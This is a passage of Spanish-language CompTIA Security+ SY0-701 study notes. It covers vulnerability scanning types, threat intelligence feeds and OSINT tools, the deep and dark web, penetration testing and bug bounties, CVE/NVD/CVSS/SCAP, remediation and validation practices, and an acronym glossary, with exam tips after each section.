| **Sin credenciales** (Unauthenticated) | Sin inicio de sesión; usa contraseñas predeterminadas de prueba | Vista de usuario sin privilegios en la red | Evaluación externa del perímetro; escaneo de apps web |
| **Con credenciales** (Authenticated) | Cuenta con derechos de inicio de sesión y permisos apropiados | Análisis profundo; detecta configuraciones erróneas internas | Simulación de ataque interno o cuenta comprometida |

> Un escaneo con credenciales es **más intrusivo** pero más completo.

#### Escaneo de Vulnerabilidades de Aplicaciones

**Análisis estático** (SAST): revisión del código **sin ejecutarlo**
**Análisis dinámico** (DAST): pruebas en aplicaciones **en ejecución**

**Vulnerabilidades específicas de apps** (requieren herramientas especializadas):
- `XSS` (Cross-Site Scripting)
- `SQLi` (SQL Injection)
- Referencias a objetos directos inseguras (IDOR — Insecure Direct Object Reference)

#### Monitoreo de Paquetes (Package Monitoring)

**Monitoreo de paquetes:** rastreo y evaluación continua de la seguridad de paquetes de software, librerías y dependencias de terceros.

- Relacionado con **SBOM** y gestión de riesgos de cadena de suministro
- Herramientas SCA (Software Composition Analysis) automatizan este proceso
- Compara el inventario de software de la organización contra bases de datos de vulnerabilidades conocidas (ej. **NVD** — National Vulnerability Database)
- Complementado con políticas de gobernanza: auditorías periódicas, aprobación de nuevos paquetes, procedimientos de actualización

> **👉 Enfoque de Examen SY0-701:**
> Pregunta: "¿Qué tipo de escaneo proporciona la visión de un atacante externo sin credenciales?" → escaneo **sin credenciales**. Nessus llama a sus actualizaciones "plugins"; OpenVAS las llama "NVTs". Ambas son herramientas de escaneo de red, no de apps web específicamente. El análisis estático (SAST) revisa el código fuente; el dinámico (DAST) prueba la app en ejecución.

### 8.3.2 Fuentes de Amenazas (Threat Feeds)

> **Analogía:** Suscribirse a un boletín de inteligencia policial en tiempo real que te avisa de los criminales activos en tu zona antes de que lleguen a tu puerta.

**Feeds de amenazas** (Threat Feeds): fuentes de información actualizadas continuamente y en tiempo real sobre amenazas y vulnerabilidades, recopiladas de múltiples fuentes.

#### Tipos de Investigación de Amenazas

| Tipo | Descripción |
|---|---|
| **Investigación basada en el comportamiento** | Narrativas que describen ataques y TTPs (Tactics, Techniques and Procedures — Tácticas, Técnicas y Procedimientos) recopilados de investigación primaria |
| **Inteligencia reputacional** | Listas de IPs y dominios maliciosos; firmas de malware conocido |
| **Datos de amenazas** | Datos informáticos para correlacionar eventos observados con TTPs conocidos; se integran con SIEM (Security Information and Event Management — Gestión de Información y Eventos de Seguridad) |

#### CTI — Cyber Threat Intelligence

**CTI** (Cyber Threat Intelligence — Inteligencia de Amenazas Cibernéticas): los datos de amenazas empaquetados como feeds para integrar con plataformas SIEM. Los datos solos no son suficientes — deben correlacionarse con datos observados en las redes del cliente (frecuentemente mediante funcionalidades de IA del SIEM).

#### Plataformas de Threat Intelligence (Propietarias)

| Plataforma | Proveedor |
|---|---|
| **IBM X-Force Exchange** | IBM Security |
| **Mandiant / FireEye** | Mandiant |
| **Recorded Future** | Recorded Future |
| **AlienVault OTX** (Open Threat Exchange) | AT&T Cybersecurity |

#### Fuentes de Código Abierto vs. Propietarias

| Característica | Código Abierto | Propietarias |
|---|---|---|
| **Costo** | Gratuitas | Suscripción paga |
| **Profundidad de análisis** | Menor | Mayor |
| **Ejemplos** | Cyber Threat Alliance, MISP (Malware Information Sharing Platform) | IBM X-Force, Mandiant, Recorded Future |
| **Accesibilidad** | Disponible para todos | Solo suscriptores |

#### Organizaciones de Intercambio de Información

- **Cyber Threat Alliance**: grupo colaborativo que comparte datos sobre amenazas y vulnerabilidades
- **ISAC** (Information Sharing and Analysis Centers — Centros de Análisis e Intercambio de Información): organizaciones por sectores industriales que comparten inteligencia de amenazas

#### OSINT — Open Source Intelligence (Inteligencia de Fuentes Abiertas)

**OSINT** (Open Source Intelligence — Inteligencia de Fuentes Abiertas): recopilación y análisis de información disponible públicamente para apoyar la toma de decisiones en ciberseguridad.

**Fuentes de OSINT:** blogs, foros, redes sociales, dark web

**Herramientas OSINT comunes:**

| Herramienta | Función |
|---|---|
| **Shodan** | Investigar dispositivos conectados a Internet |
| **Maltego** | Visualizar redes complejas de información (relaciones entre entidades) |
| **Recon-ng** | Actividades de reconocimiento basadas en la web |
| **theHarvester** | Recopilar correos electrónicos, subdominios, hosts y nombres de empleados de fuentes públicas |

> **OSINT Framework** (https://github.com/lockfale/osint-framework): recurso para localizar y organizar herramientas OSINT.

> **👉 Enfoque de Examen SY0-701:**
> ISAC es la organización de intercambio de inteligencia por sectores. CTI data se integra con SIEM. OSINT = fuentes públicas. Shodan es la herramienta más conocida de OSINT para encontrar dispositivos expuestos en Internet. El examen puede presentar "una organización del sector salud quiere compartir información sobre amenazas con otras del sector" → respuesta: ISAC. La diferencia entre threat feed propietario y open source: costo vs. profundidad de análisis.

### 8.3.3 Deep y Dark Web

> Analogía: Internet es como un iceberg. La "surface web" (indexada por Google) es la punta visible. La deep web es el enorme bloque sumergido. La dark web es una caverna secreta dentro de ese bloque, a la que solo se accede con un equipo especial.

#### Capas de la Web

| Capa | Descripción | Acceso |
|---|---|---|
| **Surface Web** | Contenido indexado por motores de búsqueda | Navegador estándar + Google/Bing |
| **Deep Web** | Contenido NO indexado por motores de búsqueda (páginas con registro, páginas bloqueadas para indexación, DNS no estándar, contenido codificado no estándar) | Navegador estándar + URL directa / credenciales |
| **Dark Net** | Red superpuesta sobre Internet usando software como TOR (The Onion Router), Freenet o I2P para anonimizar el uso | Software especializado (ej. TOR Browser) |
| **Dark Web** | Sitios, contenidos y servicios accesibles SOLO a través de una dark net | TOR Browser u otro software de dark net |

#### TOR — The Onion Router

**Enrutamiento cebolla** (Onion Routing): múltiples capas de cifrado y retransmisiones entre nodos para lograr anonimato. Cada nodo solo conoce el nodo anterior y el siguiente.

#### Usos de la Dark Web

**Legítimos:**
- Privacidad y anonimato (periodistas, activistas, denunciantes en regímenes represivos)
- Acceso a información censurada
- Investigación de amenazas cibernéticas (investigadores de seguridad)
- Inteligencia de contrainteligencia (infiltración en foros de hackeo)

**Ilícitos:**
- Intercambio de datos robados y herramientas de hackeo
- Mercados de malware y exploits
- Actividades criminales diversas

> **Importante:** La dark web como **fuente de inteligencia de amenazas** es legítima para investigadores; participar en actividades ilegales está estrictamente prohibido.

**Honeynets:** redes trampa operadas por organizaciones de seguridad para observar cómo los hackers interactúan con sistemas vulnerables → fuente de inteligencia primaria sobre TTPs.

> **👉 Enfoque de Examen SY0-701:**
> Distingue: Deep web ≠ Dark web. Deep web = cualquier cosa no indexada (incluyendo tu banco online, correo, etc.). Dark web = subconjunto de la deep web, accesible solo mediante software especial como TOR. TOR = The Onion Router = múltiples capas de cifrado. El examen puede preguntar qué tipo de red usa TOR → "overlay network" (red superpuesta). Honeynets son herramientas de investigación activa de amenazas.

### 8.3.4 Otros Métodos de Evaluación de Vulnerabilidades

#### Pentest (Prueba de Penetración)

> Analogía: Contratar a un ladrón ético para intentar robar en tu banco. Si lo logra, sabes exactamente dónde está el fallo antes de que lo encuentre un ladrón real.

**Pentest** (Penetration Testing — Prueba de Penetración): hackers éticos intentan comprometer activamente la seguridad de una organización explotando vulnerabilidades.

**Ventaja sobre el escaneo automatizado:**
- Ingenio y creatividad humana
- Detecta vulnerabilidades complejas (diseño/implementación, no solo código)
- Identifica vulnerabilidades encadenadas (varias debilidades menores que combinadas crean una falla mayor)
- Vulnerabilidades de omisión de autenticación

#### Tipos de Pentest por Conocimiento del Entorno

| Tipo | Nombre Antiguo | Información del Consultor | Simula |
|---|---|---|---|
| **Entorno Desconocido** | Caja Negra (Black Box) | Sin información privilegiada; requiere fase extensa de reconocimiento | Amenaza externa |
| **Entorno Conocido** | Caja Blanca (White Box) | Acceso completo a información sobre la red | Amenaza interna privilegiada |
| **Entorno Parcialmente Conocido** | Caja Gris (Gray Box) | Información parcial; reconocimiento parcial requerido | Amenaza intermedia |

#### Bug Bounty (Recompensas por Detección de Errores)

**Bug Bounty:** programas donde organizaciones ofrecen recompensas a investigadores externos o hackers éticos ("white hat") por descubrir y reportar vulnerabilidades.

| Característica | Pentest | Bug Bounty |
|---|---|---|
| **Quién realiza** | Equipo contratado de profesionales | Comunidad global de investigadores independientes |
| **Estructura** | Marco de tiempo definido, enfoque estructurado | Abierto y continuo |
| **Costo** | Predecible | Variable (basado en hallazgos) |
| **Cobertura** | Focalizada y exhaustiva en el alcance | Amplia (diversas habilidades y perspectivas) |
| **Control** | Alto | Bajo |

**Plataformas de Bug Bounty:** HackerOne, Bugcrowd

**Divulgación responsable:** programas implementados por organizaciones para incentivar el reporte de vulnerabilidades, con pautas claras y posibles recompensas.

#### Auditoría

**Auditoría de ciberseguridad:** revisión exhaustiva para garantizar que la postura de seguridad está alineada con estándares y mejores prácticas.

| Tipo de Auditoría | Descripción |
|---|---|
| **Auditoría de cumplimiento** | Evalúa conformidad con regulaciones (GDPR, HIPAA, PCI DSS) |
| **Auditoría basada en riesgos** | Identifica amenazas y vulnerabilidades en sistemas y procesos |
| **Auditoría técnica** | Examina infraestructura TI: seguridad de red, controles de acceso, protección de datos |
| **Auditoría de productos** | Se centra en funciones específicas (ej. código de una aplicación) |
| **Auditoría de sistemas y procesos** | Examina uso e implementación más amplia: cadena de suministro, configuración, soporte, monitoreo |

**Marcos de referencia para auditorías:** ISO 27001, NIST Cybersecurity Framework

**PCI DSS** (Payment Card Industry Data Security Standard — Estándar de Seguridad de Datos para la Industria de Tarjetas de Pago): exige pentests **anuales** para organizaciones que manejan datos de tarjetas de pago.

> **👉 Enfoque de Examen SY0-701:**
> Los nuevos nombres (entorno conocido/desconocido/parcialmente conocido) reemplazaron a caja blanca/negra/gris en SY0-701. Memoriza ambas versiones. Pregunta típica: "Un consultor realiza un pentest sin información previa sobre la red" → entorno desconocido / caja negra. Bug bounty vs. pentest: el pentest es controlado y contratado; el bug bounty es abierto a la comunidad. PCI DSS requiere pentests anuales → dato examinable. Divulgación responsable = notificar al proveedor ANTES de publicar la vulnerabilidad.

## 8.4 Análisis y Corrección de Vulnerabilidades

### 8.4.1 Vulnerabilidades y Exposiciones Comunes (CVE, NVD, CVSS, SCAP)

#### Fuente de Vulnerabilidades (Vulnerability Feed)

**Vulnerability Feed:** base de datos actualizada de vulnerabilidades conocidas que alimenta a los escáneres.

| Herramienta | Nombre de la Fuente |
|---|---|
| **Nessus** | Plugins |
| **OpenVAS** | NVTs (Network Vulnerability Tests — Pruebas de Vulnerabilidad de Red) |

#### CVE — Common Vulnerabilities and Exposures

**CVE** (Common Vulnerabilities and Exposures — Vulnerabilidades y Exposiciones Comunes): diccionario público de vulnerabilidades en SO y software de aplicaciones, mantenido por MITRE (cve.mitre.org).

**Formato del identificador CVE:**

> CVE-AAAA-####

- `AAAA` = año en que se descubrió la vulnerabilidad
- `####` = al menos 4 dígitos (orden de descubrimiento)

**Componentes de una entrada CVE:**
- Identificador único (`CVE-AAAA-####`)
- Breve descripción de la vulnerabilidad
- Lista de URLs de referencia con más información
- Fecha de creación de la entrada

#### NVD — National Vulnerability Database

**NVD** (National Vulnerability Database — Base de Datos Nacional de Vulnerabilidades): repositorio mantenido por **NIST** (National Institute of Standards and Technology — Instituto Nacional de Estándares y Tecnología) (nvd.nist.gov).

- Usa las entradas CVE como base
- Añade: análisis adicional, métrica CVSS, información sobre correcciones

#### CVSS — Common Vulnerability Scoring System

**CVSS** (Common Vulnerability Scoring System — Sistema de Puntuación de Vulnerabilidades Comunes): métrica estándar para calificar la severidad de vulnerabilidades, mantenida por **FIRST** (Forum of Incident Response and Security Teams — Foro de Equipos de Seguridad y Respuesta a Incidentes) (first.org/cvss).

**Escala CVSS:**

| Puntuación | Descripción |
|---|---|
| 0.1 – 3.9 | **Baja** |
| 4.0 – 6.9 | **Media** |
| 7.0 – 8.9 | **Alta** |
| 9.0 – 10.0 | **Crítica** |

**Factores que considera CVSS:**
- ¿Puede activarse remotamente o requiere acceso local?
- ¿Requiere intervención del usuario?
- Complejidad del ataque
- Impacto en confidencialidad, integridad y disponibilidad

#### SCAP — Security Content Automation Protocol

**SCAP** (Security Content Automation Protocol — Protocolo de Automatización de Contenido de Seguridad): protocolo utilizado por muchos escáneres para obtener actualizaciones de fuentes/plugins (scap.nist.gov).

**Funciones de SCAP:**
- Distribuir la fuente de vulnerabilidades
- Comparar la configuración real de un sistema con una línea base segura
- Definir sistemas de identificadores comunes (incluyendo CVE, CPE)

**CPE** (Common Platform Enumeration — Enumeración de Plataformas Comunes): identificador estándar para sistemas, plataformas y paquetes.

> **👉 Enfoque de Examen SY0-701:**
> Memoriza la jerarquía: CVE (MITRE) → NVD (NIST) → CVSS (FIRST). CVSS proporciona la PUNTUACIÓN; CVE proporciona el IDENTIFICADOR; NVD es el REPOSITORIO completo. Nessus = plugins; OpenVAS = NVTs. SCAP es el protocolo que distribuye las actualizaciones. Puntuación CVSS ≥ 9.0 = Crítica → remediación inmediata. El examen puede dar una puntuación CVSS y preguntar la categoría de severidad → usa la tabla.

### 8.4.2 Falsos Positivos, Falsos Negativos y Revisión de Registros

> Analogía: El detector de humo que se activa cada vez que cocinas (falso positivo) hace que eventualmente desconectes el detector → mayor riesgo. El detector que no se activa con un incendio real (falso negativo) = desastre silencioso.

#### Informes de Escaneo

- Los informes codifican vulnerabilidades **por colores** (rojo = atención inmediata)
- Se pueden revisar por alcance (las más críticas en todos los hosts) o por host
- Incluyen enlaces a detalles y técnicas de remediación

#### Falsos Positivos y Falsos Negativos

| Tipo | Definición | Riesgo | Solución |
|---|---|---|---|
| **Falso Positivo** (False Positive) | El escáner identifica incorrectamente una vulnerabilidad que NO existe | Desperdicio de tiempo y recursos; riesgo de ignorar todos los escaneos | Escaneos con credenciales (más precisos); escáneres activos/intrusivos |
| **Falso Negativo** (False Negative) | Una vulnerabilidad real NO es detectada durante el escaneo | Falsa sensación de seguridad | Escaneos periódicos repetidos; usar escáneres de diferentes proveedores |

> **Escaneos activos/intrusivos:** más adecuados para detectar más vulnerabilidades y reducir notablemente los falsos positivos.

#### Revisión de Registros para Validación

- Los registros de red y del sistema **validan** los informes de vulnerabilidades
- Ejemplo: escáner identifica proceso inestable → revisar registros de eventos → confirmar fallos del proceso en las últimas semanas → la alerta es válida
- Los scripts de escaneo automatizado pueden no replicar el éxito de un hacker experto → posible **falsa sensación de seguridad**

> **👉 Enfoque de Examen SY0-701:**
> Si el examen describe una situación donde "el equipo ignora los resultados del escáner por exceso de alertas", el problema es exceso de **falsos positivos**. Si "el escáner no encontró la vulnerabilidad que fue explotada", el problema es un **falso negativo**. La solución a falsos negativos incluye escaneos repetidos y múltiples proveedores. Los escaneos con credenciales reducen los falsos positivos porque tienen acceso real al sistema.

### 8.4.3 Análisis de Vulnerabilidades

> Analogía: Después de hacer el inventario de todos los problemas de tu fortaleza (escaneo), ahora debes decidir cuáles reparar primero, cuáles son más críticos y cuáles puedes aceptar temporalmente.

#### Dimensiones del Análisis

| Dimensión | Descripción |
|---|---|
| **Priorización** | Identificar las vulnerabilidades más críticas según gravedad, facilidad de explotación e impacto potencial |
| **Clasificación** | Categorizar vulnerabilidades por tipo de sistema/app afectado, naturaleza de la vulnerabilidad, impacto potencial |
| **Factor de Exposición** (EF — Exposure Factor) | Grado en que un activo es susceptible de ser comprometido. Considera: autenticación débil, segmentación de red inadecuada, controles de acceso insuficientes |
| **Impactos** | Pérdidas financieras, daños a la reputación, interrupciones operativas, sanciones regulatorias |

#### Variables Ambientales en el Análisis

| Variable | Influencia en el Análisis |
|---|---|
| **Infraestructura TI** | Diversidad, complejidad y antigüedad de hardware/software determinan cantidad y tipo de vulnerabilidades |
| **Panorama de amenazas externas** | Si un tipo de ataque está en auge en el sector, priorizar las vulnerabilidades relacionadas |
| **Entorno regulatorio y de cumplimiento** | Sectores regulados (salud, finanzas) priorizan vulnerabilidades con riesgo de brechas de datos y sanciones |
| **Entorno operativo** | Flujos de trabajo, patrones de uso; prácticas deficientes (gestión de parches, acceso, configuración) aumentan la exposición |

**Prácticas operativas que aumentan el riesgo:**
- Prácticas deficientes de gestión de parches
- Falta de controles de acceso rigurosos
- Falta de capacitación en concienciación de seguridad
- Prácticas deficientes de gestión de configuraciones
- Políticas insuficientes de desarrollo de aplicaciones

#### Tolerancia al Riesgo (Risk Tolerance)

**Tolerancia al riesgo:** nivel de riesgo que una organización está dispuesta a aceptar. Varía según:
- Tamaño de la organización
- Industria
- Entorno regulatorio
- Objetivos estratégicos

> **👉 Enfoque de Examen SY0-701:**
> El examen pregunta sobre EF (Exposure Factor) como parte del cálculo de ALE (Annual Loss Expectancy — Expectativa de Pérdida Anual). EF × Asset Value × ARO (Annual Rate of Occurrence) = ALE. La priorización basada en CVSS + contexto ambiental es la práctica correcta. "Risk tolerance" determina qué nivel de vulnerabilidad es aceptable — si la organización tiene baja tolerancia, debe remediar hasta vulnerabilidades de severidad media.

### 8.4.4 Respuesta y Corrección de Vulnerabilidades

#### Prácticas de Corrección (Remediation)

| Práctica | Descripción |
|---|---|
| **Implementación de parches** (Patch Management) | Aplicar actualizaciones de software/SO para corregir vulnerabilidades conocidas. Gestión centralizada y procesos robustos son esenciales |
| **Seguro de ciberseguridad** (Cyber Insurance) | Protección financiera ante brechas. No mitiga vulnerabilidades directamente — es transferencia de riesgo. Cubre: costos de respuesta, interrupción del negocio, ransomware, responsabilidad civil, extorsión |
| **Segmentación** (Segmentation) | Dividir la red en segmentos separados. Limita el movimiento lateral del atacante y contiene brechas |
| **Controles compensatorios** (Compensating Controls) | Medidas alternativas cuando la corrección directa es imposible o inmediata. Ej: monitoreo adicional, autenticación secundaria, cifrado reforzado |
| **Excepciones y exenciones** | Vulnerabilidades que no pueden corregirse por criticidad del negocio, restricciones técnicas o costos → alta dirección acepta el riesgo formalmente con documentación y cronograma de reevaluación |

**Alcance del programa de gestión de parches:**
- Sistemas operativos
- Dispositivos de red (routers, switches, firewalls)
- Bases de datos
- Aplicaciones web
- Aplicaciones de escritorio (clientes de email, navegadores, suite de oficina)
- Otras aplicaciones de software del entorno

#### Validación de la Corrección

| Método | Descripción |
|---|---|
| **Reevaluación** (Re-scan) | Ejecutar escaneos adicionales tras implementar correcciones para verificar que las vulnerabilidades fueron resueltas |
| **Auditoría** | Revisión detallada del proceso de corrección; verifica alineación con políticas y que la documentación esté actualizada |
| **Verificación** | Confirmación de resultados mediante verificaciones manuales, pruebas automatizadas o revisión de logs |

**¿Por qué es crítica la validación?**
- Errores humanos o técnicos pueden dejar correcciones incompletas/incorrectas
- Una corrección puede inadvertidamente introducir nuevas vulnerabilidades o conflictos con otros sistemas
- Proporciona responsabilización y evidencia de cumplimiento

#### Informes de Vulnerabilidades

Un buen informe incluye:
- Lista de vulnerabilidades con **clasificación de severidad** (usando CVSS)
- **Impacto potencial** de cada vulnerabilidad (brechas de datos, interrupción del sistema)
- **Recomendaciones de remediación** específicas (parches, cambios de configuración, estrategias de mitigación)
- **Formato claro y conciso** para audiencias técnicas y no técnicas
- **Presentación puntual** (demoras = mayor ventana de oportunidad para atacantes)

> **👉 Enfoque de Examen SY0-701:**
> Pregunta típica: "Una vulnerabilidad crítica no puede parchearse porque el sistema no puede reiniciarse en producción. ¿Cuál es la medida correcta?" → **control compensatorio**. Recuerda que el seguro de ciberseguridad = transferencia de riesgo, NO mitigación técnica. La diferencia entre excepción y exención: ambas implican aceptar el riesgo formalmente, con documentación y reevaluación programada. La validación mediante re-scan es el paso final obligatorio del ciclo de gestión de vulnerabilidades. CVSS es el estándar de puntuación en los informes.

## 8.5 Glosario

| Acrónimo | Significado |
|---|---|
| **ALE** | Annual Loss Expectancy — Expectativa de Pérdida Anual |
| **APK** | Android Application Package — Paquete de Aplicación Android |
| **ARO** | Annual Rate of Occurrence — Tasa Anual de Ocurrencia |
| **ASLR** | Address Space Layout Randomization — Distribución Aleatoria del Espacio de Direcciones |
| **BEAST** | Browser Exploit Against SSL/TLS |
| **CASB** | Cloud Access Security Broker — Agente de Seguridad de Acceso a la Nube |
| **CSAM** | Cloud Security Access Management |
| **CTI** | Cyber Threat Intelligence — Inteligencia de Amenazas Cibernéticas |
| **CVE** | Common Vulnerabilities and Exposures — Vulnerabilidades y Exposiciones Comunes |
| **CVSS** | Common Vulnerability Scoring System — Sistema de Puntuación de Vulnerabilidades Comunes |
| **DAST** | Dynamic Application Security Testing — Pruebas Dinámicas de Seguridad de Aplicaciones |
| **DEP** | Data Execution Prevention — Prevención de Ejecución de Datos |
| **DOM** | Document Object Model — Modelo de Objetos del Documento |
| **EF** | Exposure Factor — Factor de Exposición |
| **EOL** | End of Life — Fin de Vida |
| **FIRST** | Forum of Incident Response and Security Teams |
| **FOSS** | Free and Open Source Software — Software Libre y de Código Abierto |
| **HIPAA** | Health Insurance Portability and Accountability Act |
| **HSM** | Hardware Security Module — Módulo de Seguridad Hardware |
| **HTTP** | HyperText Transfer Protocol — Protocolo de Transferencia de HiperTexto |
| **IDOR** | Insecure Direct Object Reference — Referencia Directa a Objeto Insegura |
| **IoT** | Internet of Things — Internet de las Cosas |
| **ISAC** | Information Sharing and Analysis Centers — Centros de Análisis e Intercambio de Información |
| **KMS** | Key Management System — Sistema de Gestión de Claves |
| **KRACK** | Key Reinstallation Attacks |
| **MDM** | Mobile Device Management — Gestión de Dispositivos Móviles |
| **MISP** | Malware Information Sharing Platform |
| **NIST** | National Institute of Standards and Technology — Instituto Nacional de Estándares y Tecnología |
| **NVD** | National Vulnerability Database — Base de Datos Nacional de Vulnerabilidades |
| **NVT** | Network Vulnerability Test — Prueba de Vulnerabilidad de Red |
| **OSINT** | Open Source Intelligence — Inteligencia de Fuentes Abiertas |
| **PCI DSS** | Payment Card Industry Data Security Standard |
| **POODLE** | Padding Oracle On Downgraded Legacy Encryption |
| **RCE** | Remote Code Execution — Ejecución Remota de Código |
| **SAST** | Static Application Security Testing — Pruebas Estáticas de Seguridad de Aplicaciones |
| **SBOM** | Software Bill of Materials — Lista de Materiales del Software |
| **SCAP** | Security Content Automation Protocol — Protocolo de Automatización de Contenido de Seguridad |
| **SCA** | Software Composition Analysis — Análisis de Composición de Software |
| **SIEM** | Security Information and Event Management — Gestión de Información y Eventos de Seguridad |
| **SMB** | Server Message Block — Bloque de Mensajes del Servidor |
| **SPDX** | Software Package Data Exchange — Intercambio de Datos de Paquetes de Software |
| **SQL** | Structured Query Language — Lenguaje de Consulta Estructurado |
| **SQLi** | SQL Injection — Inyección de SQL |
| **SSL** | Secure Sockets Layer |
| **TLS** | Transport Layer Security — Seguridad de la Capa de Transporte |
| **TOCTOU** | Time-of-Check to Time-of-Use — Tiempo de Verificación a Tiempo de Uso |
| **TOR** | The Onion Router |
| **TTP** | Tactics, Techniques and Procedures — Tácticas, Técnicas y Procedimientos |
| **UEFI** | Unified Extensible Firmware Interface — Interfaz de Firmware Extensible Unificada |
| **VoIP** | Voice over IP — Voz sobre IP |
| **XSS** | Cross-Site Scripting — Secuencias de Comandos en Sitios Cruzados |

---